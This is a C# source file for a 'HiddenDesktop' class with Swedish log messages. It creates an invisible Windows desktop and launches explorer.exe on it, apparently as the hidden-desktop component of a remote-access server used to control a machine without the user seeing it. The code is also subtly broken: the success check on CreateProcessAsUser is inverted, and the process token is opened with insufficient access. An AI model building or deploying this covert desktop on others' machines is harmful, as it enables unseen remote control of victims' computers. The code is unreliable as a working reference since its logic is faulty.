using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace Server
{
    public class HiddenDesktop
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr CreateDesktop(string lpszDesktop, string lpszDevice, IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);

        [DllImport("user32.dll")]
        private static extern IntPtr OpenDesktop(string lpszDesktop, int dwFlags, bool fInherit, uint dwDesiredAccess);

        [DllImport("user32.dll")]
        private static extern bool CloseDesktop(IntPtr hDesktop);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern int CreateProcessAsUser(
            IntPtr hToken,
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        private const uint DESKTOP_CREATEWINDOW = 0x0002;
        private const uint DESKTOP_READOBJECTS = 0x0001;
        private const uint DESKTOP_WRITEOBJECTS = 0x0004;
        private const uint DESKTOP_SWITCHDESKTOP = 0x0100;
        private const uint DESKTOP_ENUMERATE = 0x0040;
        private const uint ACCESS_RIGHTS = DESKTOP_CREATEWINDOW | DESKTOP_READOBJECTS | DESKTOP_WRITEOBJECTS | DESKTOP_SWITCHDESKTOP | DESKTOP_ENUMERATE;
        private const uint TOKEN_QUERY = 0x0008;

        [StructLayout(LayoutKind.Sequential)]
        private struct STARTUPINFO
        {
            public int cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        public static IntPtr StartHiddenDesktop(string desktopName)
        {
            IntPtr hDesk = OpenDesktop(desktopName, 0, true, ACCESS_RIGHTS);
            if (hDesk == IntPtr.Zero)
            {
                hDesk = CreateDesktop(desktopName, null, IntPtr.Zero, 0, ACCESS_RIGHTS, IntPtr.Zero);
            }

            if (hDesk != IntPtr.Zero)
            {
                STARTUPINFO si = new STARTUPINFO();
                si.cb = Marshal.SizeOf(si);
                si.lpDesktop = desktopName;

                // Hämta token för den aktuella processen
                IntPtr hToken;
                bool tokenSuccess = OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, out hToken);
                if (!tokenSuccess)
                {
                    Console.WriteLine("Kunde inte hämta token: " + Marshal.GetLastWin32Error());
                    return hDesk;
                }

                PROCESS_INFORMATION pi;
                string explorerPath = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\explorer.exe";
                int success = CreateProcessAsUser(
                    hToken,
                    null,
                    explorerPath,
                    IntPtr.Zero,
                    IntPtr.Zero,
                    false,
                    0,
                    IntPtr.Zero,
                    null,
                    ref si,
                    out pi
                );

                CloseHandle(hToken);

                if (success != 0)
                {
                    Console.WriteLine("Kunde inte starta explorer: " + Marshal.GetLastWin32Error());
                }
                else
                {
                    Console.WriteLine("Explorer startad, väntar på desktop...");
                    for (int i = 0; i < 10; i++)
                    {
                        if (FindWindow("Shell_TrayWnd", null) != IntPtr.Zero)
                        {
                            Console.WriteLine("Desktop redo!");
                            break;
                        }
                        Thread.Sleep(1000);
                    }
                }
            }

            return hDesk;
        }

        public static void Cleanup(IntPtr hDesk)
        {
            if (hDesk != IntPtr.Zero)
            {
                CloseDesktop(hDesk);
            }
        }
    }
}